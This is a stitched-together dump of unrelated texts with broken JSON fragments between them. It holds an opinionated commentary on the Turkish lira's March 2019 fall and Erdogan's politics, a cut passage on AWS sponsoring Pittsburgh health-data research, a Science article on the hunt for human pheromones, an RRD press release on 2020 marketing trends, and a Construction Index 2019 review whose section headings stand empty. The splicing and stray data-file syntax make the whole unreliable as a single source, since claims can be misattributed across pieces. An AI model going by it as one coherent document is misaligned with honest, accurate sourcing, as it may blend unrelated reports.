It made for a tough day for investors who suddenly found themselves amid menacing seas. \nThe Turkish lira (TRY) was back in the wars. It lost 5.42% d/d against the USD to close the week at 5.76 after weakening as far as 5.85. The Borsa Istanbul\u2019s benchmark BIST-100 saw a drop of 3.45% d/d, taking it to 99,835, a descent that pushed the index below the psychologically important 100,000 threshold for the first time since January. The banking index fared worse, losing 6.64% d/d. \nTurkey\u2019s dollar bonds also fell across the curve. The 2043 issue tumbled to its lowest since mid-January, Reuters reported . The country\u2019s 5-year credit default swaps (CDS), meanwhile, were recorded at 381 by the end of trading on March 22, against the previous day\u2019s 351. \nDay began badly \nThe day had begun badly with a global sell-off in emerging markets assets. But Turkey\u2019s market rout was triggered by Turkish President Recep Tayyip Erdogan\u2019s response to US President Donald Trump\u2019s tweet suggesting Israeli sovereignty over the Syrian Golan Heights should be recognised. \nBy Erdogan\u2019s standards, his reaction to Trump\u2019s latest foreign-policy-bombshell-by-tweet was actually pretty mild. In a speech at a gathering of the Organisation of Islamic Cooperation (OIC), he reportedly said : \u201cWe cannot allow the legitimisation of the occupation of the Golan Heights.\u201d \nHe was also cited as saying that Trump\u2019s statement brought the region to the brink of a new crisis, but Turkish public broadcaster TRT World released a video of Erdogan making his Golan comments and they do not really amount to much more than a few reticent sentences in passing; the remarks have nothing on the yelled angry rhetoric we are used to from Erdogan, such as what he is presently dishing up at rallies on the stump for the upcoming March 31 Turkish local elections. \nIt is actually hard to rationalise Erdogan\u2019s interest in the Golan Heights. The territory is internationally recognised as not Israeli\u2014but that means the region in the Levant, under Israeli occupation since 1967, is in fact seen as that of Erdogan\u2019s arch-enemy Syrian President Bashar al-Assad. There is of course the angle that Erdogan is seizing on the issue to step up his confrontation with Israel and opposition to Trump\u2019s full-on backing of Israeli PM Benjamin Netanyahu, another bitter enemy of the Turkish strongman, against the Palestinians. But at the end of the day there will be plenty of Turks not particularly interested even in where the Golan Heights are located\u2014they have nothing to do with Palestine, they are \u201cAlevi\u201d Assad\u2019s territory. Or is Erdogan getting ready to strike a deal with Assad as urged by Vladimir Putin in January? \nUnnecessary organisation \nThe OIC is an unnecessary organisation. But it is presently led by Erdogan and he calls OIC gatherings whenever he wants to send a message to his voters. Erdogan\u2019s media machine swings into action, portraying his superfluous words at the OIC as important pronouncements coming from the purported leader of the Islamic World. Erdogan made plenty of noise at the OIC when Trump last year announced the US would switch its embassy in Israel to Jerusalem, but the issue was then quickly forgotten. \nNotably, Erdogan was the only president who attended the latest OIC meeting, held in Istanbul. Iran was represented by its foreign minister Javad Zarif, while Saudi Arabia sent its ambassador to Ankara, Reuters reported . New Zealand\u2019s foreign minister Winston Peters was also there for a quick t\u00eate-\u00e0-t\u00eate with Turkey\u2019s populist leader following his decision to use footage of the Christchurch terrorist mass shootings at his election rallies and make incendiary comments such as \u201cThis is not an isolated event, it\u2019s something more organised\u201d before later accusing the west of \u201cpreparing\u201d the killer\u2019s manifesto and \u201chanding it to him\u201d. \nA regular Erdogan voter who watches the rallies\u2014literally aired all-day-long on Turkish television\u2014might easily think by now that New Zealanders are boarding ships to attack Turkey via the Dardanelles, just as the Anzacs aboard British Royal Navy ships did during World War I. \nPeters, who prior to departing for Turkey made it plain he thought Erdogan\u2019s comments might place the lives of New Zealanders in Turkey at risk, met Erdogan and then told reporters he did not ask him to stop showing the footage, filmed by the alleged killer, of the mosque shootings because he understood the screenings had stopped, according to Reuters . \nHowever, two hours later Erdogan again showed excerpts from the video at a rally, the news agency reported . \nMade a \u2018darling\u2019 by the west \nErdogan, let\u2019s not forget, was made a \u2018darling\u2019 by western capitals led by Washington. One day, the whole planet might like to stop to think for two seconds how the other half of the Turks\u2014those who look upon his works and despair\u2014have felt since he took the helm of the country back in 2002. \nAfter Erdogan\u2019s Golan remarks ignited a small earthquake under the already fragile Turkish markets , the central bank stepped in with a return to unorthodoxy. As the lira nosedived, it announced in a written statement that one-week repo auctions would be suspended for a certain period of time. \nLiam Carson of Capital Economics subsequently released a research note observing: \u201cThe continued plunge in the Turkish lira today, even after the central bank (CBRT) took steps to tighten monetary conditions, highlights the bind the institution is in\u2026 The most likely explanation for this is that markets see the move as a reflection of the limitations of the central bank. It is still resorting to backdoor tightening (via the use of its interest rate \u2018corridor\u2019) rather than raising official interest rates. \n\u201cIt has used the \u2018corridor\u2019 in the past to tighten monetary conditions while avoiding a vitriolic response from President Erdogan. Mr. Erdogan has said surprisingly little about monetary policy recently. But for all of the central bank\u2019s hawkish rhetoric since September\u2019s aggressive rate hike, today\u2019s move is a reminder that politics will continue to cast a shadow over its policymaking.\u201d \n\u201c[H]iking the base rate, the 1-week repo rate. Could be last chance for current CBRT management to prove themselves. They need to show they have learned,\u201d senior emerging markets sovereign strategist Timothy Ash of Bluebay Asset Management reacted in an emailed note to investors. \u201cToday\u2019s move is [just] about buying time.\u201d \nAlso on March 22, Agriculture Minister Bekir Pakdemirli announced that TRY1.4bn worth of agricultural support payments would be executed at 18:00 local time. That meant there would be an additional chunk of liquidity in the Turkish markets in election week. \nAlbayrak takes to the airwaves \nOn the evening of March 22, Erdogan\u2019s telegenic son-in-law and finance minister Berat Albayrak took to the airwaves for a joint live broadcast made by several loyal TV stations. Speculators were talking down the economy on social media and this was similar to what happened during the anti-government Gezi Park protests in 2013, he said. Albayrak did not offer examples or names. \nJust lately, Albayrak was making fun of those who bought dollars at 6 lira, saying that it was unwise because everything would be so much better after the elections and the worst of Turkey\u2019s economic turmoil had been over and done with since last September. He even went so far as to claim that inflation, currently a touch below 20%, would be in the single digits six months from now . \nTo be fair, the Erdogan family\u2019s ability to connect almost everything to Gezi is remarkable. The world\u2019s best conspiracy theorists seem wet behind the ears in the face of their constructs. The Erdogan regime\u2019s prosecutors, on the other hand, are a little lazy with their bills of indictment. Sometimes they just copy-paste. But the stories they tell are almost always in the surrealist genre. They have a certain style. \nShocked by fall in reserves \nOn March 21, the day before Albayrak went live on TV, some market observers were shocked by a $6.3bn fall in the central bank\u2019s net international reserves in the two weeks to March 15. The reserves were down to $28.5bn according to the regulator\u2019s weekly bulletin , marking the biggest drop since January 2014, when the monetary policy maker was eventually forced into raising rates in an emergency meeting to prop up the lira, Bloomberg noted . The observation was made one day before the central bank scrapped the one-week repo auctions to deliver an implicit rate hike. \n\u201cThe latest decline in reserves can\u2019t be explained by external debt payments alone, which amount to a total $3.8bn for March, according to the Treasury\u2019s financing program,\u201d Bloomberg also noted. \nSome observers cottoned on to how the decline in the FX reserves did not match the rise in lira reserves. \nThe awaited explanation came from an unnamed central bank official late on the evening of March 22. There was nothing unusual in the fall of the reserves, the official said, as it was due to $5.3bn worth of external debt payments along with FX sales to energy importers, Reuters reported. \nThe Treasury\u2019s external debt repayments or current FX transfers, as well as its domestic and external FX borrowings, FX sales to energy importing public companies, export rediscount credits, and lenders\u2019 FX-denominated required reserves along with foreign exchange deposits against Turkish lira deposit auctions, FX collateral deposit transactions, FX and lira swaps could result in some \u201ctemporary\u201d fluctuations in reserves, according to the unnamed central banker. \nSome patriotic economy pundits find it stupid to think that the lira was being manipulated by the central bank because \u201cit is a free market and how could the central bank do that\u201d. Data for the central banks\u2019 foreign exchange deposits against Turkish lira deposit auctions, FX collateral deposit transactions and FX-lira swaps is available on the authority\u2019s official website under the \u201c Markets Data \u201d page. Data on the central bank\u2019s growing short position in FX contracts on the Borsa Istanbul\u2019s derivatives market is available on the BIST\u2019s official web page . \nIntriguing IMF comments \nMeanwhile, IMF spokesman Gerry Rice\u2019s intriguing comments given at a regular daily press briefing on March 21 in response to a quick question on Turkey, namely that \u201cthere are a lot of reports that the cracks in Turkey\u2019s economy keep getting larger\u201d, passed unnoticed amid Erdogan\u2019s noise. \n\u201cI don\u2019t have a great deal to tell you on Turkey\u2026, except that we are, IMF staff are, now assessing\u2026, the possible impact of the recently announced tax changes. More broadly speaking, Turkey\u2019s economy is slowing sharply, and underlying vulnerabilities remain. The authorities are urged to pursue a comprehensive set of policies to credibly and consistently address the key underlying imbalances. Again, we\u2019ll have more to say in a couple of weeks,\u201d Rice said, according to the script of his press briefing . \nThere could be a question here as to whether the IMF staff are discussing a post-election deal for Turkey. Rice\u2019s face might better explain the IMF\u2019s assessment of the Turkish economy, starting from the 28th minute of the video of the briefing. \nRaci Kaya, who represents Turkey at the IMF, was quick to respond to Rice\u2019s comments. He told the state-run Anadolu news service that Rice\u2019s statements \u201ccan\u2019t be viewed as sincere,\u201d according to Bloomberg\u2019s translation. \n\u201cIf Rice had asked us for adequate information, we\u2019d have provided that,\u201d Kaya also said, adding that he was puzzled by Rice\u2019s statements. The Turkish economy had signalled a return to growth in Q1 and the IMF should be more careful about its assessment of Turkey\u2019s economy and \u201ccommunicate with [government officials] better,\u201d according to Kaya. \n\u201cIt\u2019s puzzling that they are puzzled...,\u201d Ash at BlueBay said in an emailed note to investors. \nUnfortunately, it\u2019s time again\u2026 \nIt is unfortunately time again to remind ourselves of last year. In February 2018 , the IMF warned that the Turkish central bank\u2019s monetary policy should be tightened to deal with rising inflation and that the current account deficit was growing and the budget metrics were deteriorating. Vulnerabilities included large external financing needs, limited foreign exchange reserves, increased reliance on short-term capital inflows, and high corporate exposure to foreign exchange risk, the Fund pointed out. \n\u201cThey tell us to slow down growth,\u201d Cemil Ertem, an advisor to Erdogan, said in a response to the IMF\u2019s warnings. \u201cWe\u2019re going to do the exact opposite.\u201d \nAs was the case from April to the beginning of September last year, the long list of reasons behind the lira weakness is in rude circulation again. The list now lacks \u201cthe skyrocketing current account deficit\u201d, but it has hardly grown much shorter. \nStill creating jitters are elections (local ones this time, though note that the municipal polls due next weekend are the last scheduled elections Turkey must hold for around four years), volatile relations with the US (there\u2019s serious angst over how Ankara and Washington can resolve their stand-off over Nato member Turkey\u2019s plan to acquire Russia\u2019s S-400 advanced missile system while still demanding its order for a juicy S-400 target, namely the west\u2019s most advanced jet fighter, the F-35, be fulfilled, but the brittle Trump-Erdogan accommodation could also be seriously disrupted by more rows over US support for Syrian Kurd militants, Ankara\u2019s failure to abide by the White House\u2019s Iran sanctions and perhaps action from the US against Halkbank in relation to a sanctions-busting case, or perhaps the throwing of another \u201cjailed pastor\u201d into the equation, among other possibilities), the continued expansion of dollarisation among Turks, measures hobbling the free market (such as officials \u201cencouraging\u201d banks to cut deposit and lending rates and boost lending volume, state interference in private trade such as via Albayrak\u2019s street stalls selling discounted vegetables to combat alleged price gouging in shops, raids on warehouses to meet the state\u2019s pricing behaviour objectives, price controls and so forth), conflicting monetary and fiscal policy stances (the policy rate stands tight while the government simultaneously pumps money into the economy via public lenders and booming fiscal expenditures), abnormal (or \u2018new normal\u2019) domestic policymaking driving the polarisation of society, sticky official inflation that won\u2019t budge far from 20%, high external financing needs demanding unabating inflows of capital, the ongoing recession failing to transition to a V-shaped recovery but taking the L-shaped course instead, limited FX reserves\u2026 The list is legion. \nMarkets buy the \u201crebalancing\u201d story \nUntil last week, Turkey\u2019s \u201crebalancing\u201d theme was being successfully sold harmoniously by the Turkish government and its hot money financiers in London. The turnaround in perception came not too long after the currency crisis reached its nadir in August. Fresh from being appointed finance minister following Erdogan\u2019s re-election in late June\u2019s snap poll, Albayrak \u201clistened\u201d well during meetings he held in the inner sanctum of global finance (although his plan to bring in \u2018blue-blooded\u2019 Wall Street consultants McKinsey was a step too far for Erdogan who tore the commission to shreds). \nOfficials and foreign commentators became sure the story of Turkey getting back on the rails was working efficaciously. You might say, however, that people were being lulled to sleep, expected to enjoy their slumber despite Turkey\u2019s record-breaking dollarisation and heavy sell-off by non-residents of domestic government debt paper, which began flicking on red lights at the beginning of March. \nThe sharp contraction in the alarming current account gap is given as representing the proof of the pudding in the so-called \u201crebalancing\u201d story. Some foreign analysts even expect Turkey to move to a surplus. For sure, it is within grasp, but it would simply mean more Third World rats waiting in cheap-veg queues and more Third World businessmen waiting in debt restructuring or bankruptcy protection queues or the onset of horribly long bankruptcy queues. \nWould it be possible for the Erdogan regime to curb public reaction against intensified \u201crebalancing\u201d with only sticks and dramatically less carrots? It surely would be, but it would obviously require more external support to overlook blatant deficiencies in Turkey\u2019s undemocratic democracy. And the cost to be paid in the form of interest payments could only go up even further. \nOne of the main themes in the much hawked \u201crebalancing\u201d tale is the commending of the central bank for last autumn biting the bullet and pushing up its policy rate to 24%, although the disparity between the \u201cencouraged\u201d market rates and official inflation\u2014officially given as just below 20% but there are those economists who say it must stand a good deal higher\u2014has reached uncontainable levels, fuelling FX deposits. Despite the heavy PR campaign suggesting Ankara would adhere to a strong fiscal stance, the wash of pre-election liquidity let loose via public banks\u2019 lending and government expenditures also obviously add to FX demand. \nSince the beginning of 2019, pinkish-as-much-as-fragile global sentiment has also supported Turkey\u2019s \u201crebalancing\u201d story. However, \u201ca spell of relative calm for EM currencies was broken this month, as several including the Argentine peso, Turkish lira, Brazilian real and South African rand fell sharply, despite a more dovish US Fed\u201d, Capital Economics highlighted on March 22 in a note entitled \u201cEM currencies come back into the firing line\u201d . \u201c[Y]ields on local currency government bonds rose across the [Emerging Europe] region, but the largest rise came in Turkey,\u201d the economic research company said on the same day in its weekly regional chart book . \nEurobond markets start to \u201ctire of Turkey\u201d \nMore bad news came on the eurobonds front. Turkish lenders were on the market for syndicated renewals that were to be completed by April or May, but as Lewis McLellan of Global Capital commented on March 21 in a piece entitled \u201c Markets beginning to tire of Turkey \u201d: \u201cTurkey\u2019s capital markets rehabilitation has been one of the most remarkable emerging markets stories of the past six months, but investors\u2019 appetite for the nation\u2019s paper is finally starting to wear thin.\u201d \nState-controlled lender Vakifbank said on March 21 in a bourse filing that it sold $600mn worth of 5-year USD-denominated eurobonds but at a coupon rate of 8.125%. \nMeanwhile the on-off US-China trade war (not to mention rumblings of a showdown ahead between Trump and Europe), Brexit and global slowdown woes are still on the horizon when it comes to the external front. \n\u201cBut it is fair to say that the writing has been on the wall for the lira for some weeks now, and particularly because of steadily rising dollarization as reflected in the constant accumulation of FX deposits by the population. This underlying lack of confidence by locals for the lira is pretty telling\u2014as they don\u2019t seem to buy the story. And if they don\u2019t then why should foreigners?\u201d Ash, a devoted lira bull from the beginning of September to March, agreed on late March 22 in an emailed note to investors after a trip to Turkey. \nOn March 22, Robin Brooks of the Institute of International Finance (IIF) and Ash attended a panel at the Uludag Economy Summit held in the northwestern city of Bursa, the heart of Turkey\u2019s automotive industry. Their main call was for the Turks to make a clear return back to the Western fold. \nNet sales of domestic government debt securities executed by non-resident fixed income investors amounted to $1.41bn in the 12 week-period from December 21 to March 15, according to the latest data from the central bank . In the same period net purchases of Turkish equities by non-resident equity investors amounted to $1.33bn, but the week ending March 15 brought their largest weekly net sale, amounting to $106.5mn. \nElection uncertainty weighs on capital flow \n\u201cUncertainty in the run-up to local elections in Turkey at the end of this month has unfortunately weighed on the capital flow picture, with our daily tracker falling to the most negative since the EM sell-off in 2018. This deterioration explains some of the pressure on the Lira,\u201d Brooks said on March 22 in a tweet. \nAsh also observed in his trip notes email that \u2018normalisation\u2019 following the elections is \u201cthe buzz word in Ankara these days\u201d, \u201cmeaning fiscal policy tightened, state bank lending moderated, structural reforms rolled out, and some of the non market responses to high inflation (price controls) ended\u201d, and, also \u201ca more orthodox monetary policy stance, which could still open the way for rate cuts this year if in the immediate period the lira is stabilised\u201d, and \u201ca deal with the US over the S400s\u201d. \nIt seems Erdogan\u2019s election bill will be a costly one. Certainly for ordinary Turks absorbing the economic shocks. \nWhat is clear to Ash is that if the S-400 missiles are delivered as planned by Russia in July, then the US will sanction Turkey. \nThe S-400 issue is indeed a really tough matter to gauge given that two horse traders currently govern the US and Turkey. Some Turks are trying to sell the story of Ankara selling the missiles to a third party rather than installing them in Turkey. On the other hand, Erdogan seems determined to have them, maybe believing in the leverage they will give him. \nSpeculation is also mounting over which sanctions the US could impose on Turkey, but there is one clear conclusion; if even just talk of sanctions over the Pastor Brunson affair sent the Turkish economy heading for disaster last August, why should things be any different this time. \n\u201cNow the policy response should be for the CBRT to hike policy rates,\u201d Ash unsurprisingly concluded, added: \u201c[I]f the CBRT does not stabilise the lira now, and we see another bout of lira weakness, we end up back in the lira\u2019s death spiral circa 2006, 2012/13, 2015/16 and worst of all 2018\u2014higher inflation, more damage to banks and corporate balance sheets, and a deeper recession.\u201d \n\u201cAfter all the [Erdogan ruling party] AKP and its MHP partner won, against expectations, the 2018 parliamentary elections and Erdogan won the presidency in the first round [re-election last year], again against all expectations,\u201d he added. \nSuffice to say here that the markets may well wonder at Erdogan\u2019s mystifying ability to keep comfortably winning elections despite the odds set against him. But they also know this winner keeps paying high interest. \nPost-election scenarios \nAsh also posed some questions on post-election scenarios: \u201cThe question is what happens if the AKP-MHP coalition does poorly? Will this fundamentally weaken Erdogan, making him less willing to take the politically difficult and economically unpalatable decisions to \u2018normalise\u2019 policy after the elections which is now most people\u2019s base and best cases (?) And will his [nationalist] MHP [parliamentary] coalition partner stay with the AKP, or pull its support risking early elections and yet another election cycle that Turkey absolutely does not need at this stage?\u201d \nErdogan could ride out any public reaction against his \u201cnormalisation\u201d policies as long as he holds on to his global recognition. It is not a secret that Syria\u2019s Assad was being bombed by the Western coalition for destroying cities while the global media hardly batted an eyelid at Erdogan\u2019s domestic fight against \u201cterrorism\u201d, waged at the cost of almost entirely wrecking some of his cities. \nHowever, the question raised over the road that will be taken by MHP leader Devlet Bahceli is a billion-dollar one. In 2002, when the then coalition government was expecting to harvest some fruit from the IMF deal that followed the 2001 crisis, then Deputy PM Bahceli abruptly called snap polls. It was those elections that made Erdogan the PM with a parliamentary majority despite his party securing just 34% of the vote. All the parliamentary parties were punished by voters, pushing them below the 10% threshold for representation in the legislature. \nWe should also cast our minds back to election night of June 2015, when Erdogan lost his parliamentary majority. Bahceli once more called snap polls. And then there was Bahceli\u2019s course of action following the failed coup attempt of June 2016. The MHP party chief called for the referendum that, on the official counting of the vote, narrowly delivered the constitutional changes for a \u201cTurkish-type\u201d presidential system, the country\u2019s first executive presidency that has done away with the post of prime minister and rolled back parliament\u2019s powers. Last April, moreover, it was Bahceli who demanded the snap parliamentary and presidential polls, which handily took place before most Turks could realise just how dire an economic morass they were headed for. \nBahceli\u2019s only real concern is with Kurdish \u201cterrorism\u201d. Or perhaps we should translate that as \u201cany kind of collective political rights for the Kurds\u201d. He won\u2019t make much trouble for Erdogan as long as his post-local-election \u201cnormalisation\u201d policies do not include any softening up in the fight against Kurdish \u201cterrorism\u201d at home and abroad. However, it is Bahceli. He is fond of a big surprise. And it is Turkey. This is a country always liable to turn up any manner of surprise that changes everything in a split second. \nAKP \u201chas to retain\u2026 bastion of Istanbul\u201d \nLooking at what the Erdogan administration might accept as a good election result in the circumstances, Ash said \u201cat a minimum, the AKP has to retain their hitherto bastion of Istanbul, and it would be better for the party to retain Ankara and Bursa. Losing all three would be a bitter blow to Erdogan and the AKP, but also important will be whether nationally the AKP/MHP coalition secures close to 50% of the vote. If their combined vote drops sufficiently close to 40% and the coalition loses all three of the cities mentioned above then Erdogan and the AKP would be in peril of a break with the MHP and therein losing its parliamentary majority and even splinters from the AKP\u2014talk again of the likes of Davutoglu, Babacan and Gul leading some breakaway \u2018reform\u2019 AKP faction.\u201d \n\u201cErdogan is a shrewd political operator, a brilliant campaigner and reader of the mood of the Turkish nation,\u201d in Ash\u2019s eyes. Whether that mood would read rather differently if 95% of the Turkish media was not dominated by Erdogan is a question that should not go away. \nErdogan \u201ccan still pull a victory out of the bag on this one, surprising the pundits and winning the election,\u201d according to Ash. Well, yes, but what the vote-counters have been pulling out of the bags in Turkey in recent years\u2014let\u2019s not forget the unstamped ballots the election watchdog has made a habit of giving its blessing to\u2014has been rather peculiar. \nSome curious data to end with \nOn a final note, here\u2019s some curious data that bears further enquiry: the percentage of the central bank\u2019s gold reserves held in Turkey rose to 80% at end-2018 from 17% at end-2017, Ugur Gurses pointed out on March 18 in a blog post based on the regulator\u2019s annual report . \nAnd Gurses has also noted, the national lender has employed $1.4bn of its USD reserves to buy gold reserves since Trump\u2019s son-in-law Jared Kushner visited Ankara at the end of February, while the US Treasury paper in its portfolio declined to a value of $3.2bn at end-January from $61.2bn at end-November 2017. We can expect to hear more about that.",

Through this sponsorship with AWS, teams will have access to flexible cloud computing resources and machine learning tools that they can use to accelerate their investigations and scale to meet future needs.\u201d \n\n \nThe PHDA relies on \u2018big data\u2019 such as EHR information, diagnostic imaging, prescriptions, genomic profiles and insurance records to determine best approaches for treatment and prevention, and to help patients better understand the care they are receiving. \n\n \nLike many organizations, the PHDA is seeking to integrate machine learning and advanced computing power into healthcare offerings and practices to gain and apply insights that can improve treatments and services for patients. Amazon offers a variety of products for this task, such as Amazon SageMaker, a cloud machine learning platform and Amazon Elastic Compute Cloud (Amazon EC2), a part of Amazon.com\u2019s cloud-computing platform. \n\n \nNew machine learning technologies and advances in computing power, like those offered by Amazon SageMaker and Amazon EC2, are making it possible to rapidly translate insights discovered in the lab into treatments and services that could dramatically improve human health.\n\n \nThrough the AWS Machine Learning Research sponsorship, PHDA researchers from Pitt and CMU plan to advance research and product commercialization for eight projects. One specific example is Pitt\u2019s use of AWS resources to form an objective, predictive tool for guiding surgical interventions of abdominal aortic aneurysms, the 13th-leading cause of death in western countries, before symptoms appear. Another is the development by CMU of algorithms and software tools to better understand the origin of tumor cells and predict how they will likely change and grow in the future. \n\n \nOther areas of interest include medical imaging, mental health, the creation of an individual risk scores for cancer patients, and reducing medical diagnostic errors with data mining. \n\n \n\u201cAmong eight projects that AWS will support, three are developing new technologies to enhance the prognostic and diagnostic capabilities of medical imaging. In all three cases the research teams need to manipulate multimodal data sets, rigorously test their algorithms, and make iterative improvements as new data is incorporated. The AWS tools and environments offer a means to do this quickly and efficiently. Other projects that will benefit from the support provided by AWS are developing tools to advance precision medicine for cancer, identify new biomarkers for mental health assessment, and improve the process of diagnostic coding.\u201d\n\n \nData used in the projects will be secure, anonymized and remain with PHDA institutions.",

      "text": "Can atmospheric chemists rescue the stalled quest for a human pheromone? \nBy Kai Kupferschmidt Apr. 11, 2019 , 12:30 PM \nCHICHELEY, U.K.\u2014 Jonathan Williams mostly studies the molecules that oceans and rainforests give off into the atmosphere. He\u2019s an unlikely recruit to a new cause: rescuing the decadeslong search for a human pheromone\u2014a chemical signal in human body odor\u2014from the doldrums. Williams, who is at the Max Planck Institute for Chemistry in Mainz, Germany, joined two other atmospheric chemists here last week at a small Royal Society meeting on chemical communication in humans to describe how their workhorse technique for studying trace chemicals in the atmosphere, proton transfer reaction mass spectrometry (PTR-MS), could aid the pheromone hunt. \u201cIt really feels like we are on the brink of something great,\u201d says one of the meeting\u2019s organizers, psychologist Craig Roberts of the University of Stirling in the United Kingdom. \nSomething great is what the field needs. Since 1959, when German biochemist Adolf Butenandt isolated the first pheromone\u2014a compound named bombykol that female silkmoths use to attract partners\u2014generations of researchers have looked for similarly powerful chemicals in humans. But they haven\u2019t identified a single one. The few high-profile claims, for example that women living together synchronize their menstrual cycle through chemical signals, have not stood the test of time. \u201cThe field is in a bit of a crisis,\u201d says Andreas Natsch, a researcher at the fragrance company Givaudan in Vernier, Switzerland. \nPart of the reason is that it\u2019s a small field with relatively little funding. \u201cSmell is the Cinderella of human senses,\u201d says zoologist Tristram Wyatt of the University of Oxford in the United Kingdom, who has written a textbook on pheromones. Past studies often used small numbers of volunteers and questionable statistical methods. And then there is the sheer complexity of the subject. The human body emits hundreds of volatile compounds. Most pheromone studies give no more than a snapshot of them, for instance by asking participants to wear a T-shirt for a night or putting pads under their armpits and then analyzing captured compounds with a mass spectrometer. \nBy contrast, PTR-MS\u2014which works by transferring a proton to volatile compounds in the air and then analyzing their mass from how they move in an electric field\u2014is more like producing a video; it allows researchers to measure compounds in real time and to identify those that change in abundance after a certain type of stimulation. \u201cYou can eliminate a lot of hay from the haystack we have been searching through,\u201d Roberts says. \nWilliams glimpsed the technique\u2019s potential years ago, when he analyzed the air around soccer fans during a game at a stadium in Mainz. \u201cWe could follow people\u2019s behavior by following the chemicals they emitted,\u201d he says. For instance, acetonitrile, a component of smoke, peaked at half time, when many people lit up a cigarette. \nIt really feels like we are on the brink of something great. \nCraig Roberts, University of Stirling \nWilliams wondered what the chemical signature of the euphoria after a goal would look like. That match, however, offered no joy, as it ended with a 0-0 score. To avoid another disappointing outcome, Williams turned to a local cinema instead. He found not only that crowds watching funny and suspenseful movies generate different chemical signatures, but also that the emissions change with plot twists. \u201cIn The Hunger Games , you could tell exactly when the heroine starts the big showdown fight,\u201d Williams says. In a paper in Scientific Reports , he reported that carbon dioxide levels increased, probably as the audience breathed faster; so did isoprene, which could be given off by twitching muscles. \nAnother atmospheric scientist, Ben Langford at the Centre for Ecology & Hydrology in Edinburgh, was so intrigued by the work that he decided to team up with Roberts, who was excited to learn about PTR-MS. Langford says: \u201cIt was almost like I was handing him a key to a door he had always wanted to open.\u201d In studies that they are preparing for publication, the duo has been showing movie clips to volunteers while analyzing the air under their armpits. They have identified some compounds that change in abundance during frightening scenes and plan to investigate further; whether the molecules constitute an actual chemical signal, however, is still unclear. \nThat study joins other work focusing on fear or aggression\u2014a change after many years when pheromone research has searched for signals linked to sexual attraction and mate choice, which some now think may be harder to find. (\u201cIt used to be all about love and now in the age of [U.S. President Donald] Trump fear and aggression are the important topics,\u201d Natsch says.) In one ongoing study presented at the meeting, scientists collect sweat from Israeli soldiers before their first parachute jump and compare it with sweat collected in a different setting. Such extreme, life-or-death situations might present the best shot at identifying a chemical signal, Roberts says. \nThat signal may well turn out to be not a specific \u201cfearomone\u201d but a complicated series of changes in the abundance of several compounds, just the kind of thing Williams and his colleagues are accustomed to tracing in the atmosphere. That his new field is less mature than atmospheric chemistry only makes it more attractive, Williams says: \u201cThere is such an opportunity for discovery here.\u201d",

      "title": "5 Trends To Define Marketing Strategies in 2020",
      "text": "R.R. Donnelley & Sons company, a global provider of multichannel solutions for marketing and business communications, has unveiled the five trends that will shape marketing decisions for 2020. Earlier this year, and for the first time, RRD was ranked No. 8 in the U.S. on the 75 th annual Ad Age Agency Report , which classifies and analyzes advertising and marketing-services agencies based on U.S. and worldwide revenue. \nFrom its own experience leading the marketing industry, RRD has honed in on five key trends that will be pivotal to marketers seeing success in 2020, including: \nTrend No. 1: From omnichannel to optichannel. \nFor years, marketers have been working to consider every channel in order to be successful. While this may have been realistic a decade ago, the vast number of channels make it ineffective to activate campaigns across all these channels and mediums. In 2020, marketers will take a step back and adopt a more holistic approach, essentially ditching the omnichannel mindset in lieu of \u201coptichannel,\u201d which means making strategic decisions based on the brand promise, customer expectations, personal preferences, and the anticipated return on investment. \nTrend No. 2: The pop-up comeback. \nIn an age where major retailers like Toys \u2018R\u2019 Us and Barneys are shutting their stores, these same brands are also making a return via the pop-up . These retailers are now hosting pop-up events aimed at creating unique and memorable consumer experiences. The goal of a retail pop-up store is to build brand interactions that make a lasting impression with customers. In 2020, marketers need to view experiences as the new form of brand promotion and engage consumers through immersive activations. \nTrend No. 3: Voice marketing finds its voice. \nWhile voice search and voice assistants were novel just a few years ago, they are on the cusp of becoming a household item. In fact, it\u2019s expected that the base of installed smart speakers will reach 225 million units by 2020 and 30% of all web searches will be done without a screen. For marketers to get ahead in 2020, they need to define how voice marketing should be integrated into their overall marketing strategy. \nTrend No. 4: The human element matters. \nRecent research into Instagram marketing shows that influencer-sponsored posts have grown by more than 150 percent in the past year. This is not surprising as 70 percent of U.S. consumers that follow influencers on social media platforms say they trust influencer opinions as much or more than their real-world friends. The key takeaway is that consumers trust hearing from real people, whether they are online influencers or friends and family, potentially more than hearing from a brand directly. To win and keep customer loyalty, marketers need to make a strategic investment with influencers who embody their company values and have an authentic relationship with their followers. \nTrend No. 5: First impressions count more than ever. \nWhether a consumer buys a product at the store or gets it shipped directly, the first impression counts, sometimes just as much as the product itself. In-store, consumers are presented with a plethora of choices that can get overwhelming. A product\u2019s appearance can make a difference in the final decision. At the same time, at home, the first interaction with a new purchase is actually the box - not the product. According to a national study conducted by the Paper and Packaging Board and IPSOS, seven in 10 consumers agree that packaging can influence purchasing decisions. In 2020, the most successful brands will use clever, trendy and sustainable packaging to attract new buyers and create loyal customers. \n\u201cNew technology and channels have made marketing and customer communications more complex in recent years,\u201d said Dan Knotts, president and CEO of RRD. \u201cConsumers are being bombarded with advertisements and product choices virtually everywhere. The market is so saturated that standing out as a brand may feel like mission impossible at times. The recipe for success in 2020 is not quite so complex. Brands should focus on building genuine connections and memorable experiences by strategically leveraging physical and digital channels.\u201d \nThe preceding press release was provided by a company unaffiliated with Printing Impressions.

      "text": "In 2019, the 10th year of our daily free-to-view news service, The Construction Index reached more than three million users in the UK alone, and more than four million worldwide. \nIn recent years we have seen a single event dominate the news agenda for the whole year. In 2017 it was the Grenfell Tower fire and in 2018 it was the collapse of Carillion, which went into liquidation at the very start of that year. There was no such single major event that reverberated quite like either of those in 2019, although Interserve came close before the banks came to its rescue. Grenfell continues to have significant ramifications that have yet to be adequately tackled by either government or industry, and it will continue to generate headlines in 2020 as the official inquiry turns its attention to the role of the construction industry in the events leading up to the tragedy. \nSo in the absence of any single event proving quite so tumultuous in 2020, here are some of the headlines that helped to define the year for the UK construction industry, some of the recurring themes that won't go away, some of the more interesting stories that you might have missed, and perhaps one or two pointers to what might lay ahead of us in 2020. Just click on the headline in each case to see the full report. \nI have deliberately avoided mention of Brexit or other issues that dominated the wider national political agenda. I have no desire to bore you. \nHere we go. \nBig deals and corporate developments \nIdeas: mad, bad and brilliant \nGrenfell cladding issues remain firmly unresolved \nUnresolved danger for workers on the railways \nThe cheats getting caught out: \nAnd some of those we have lost: \nGot a story?

      "title": "How To Set Up a Google Ads Display Network Campaign",
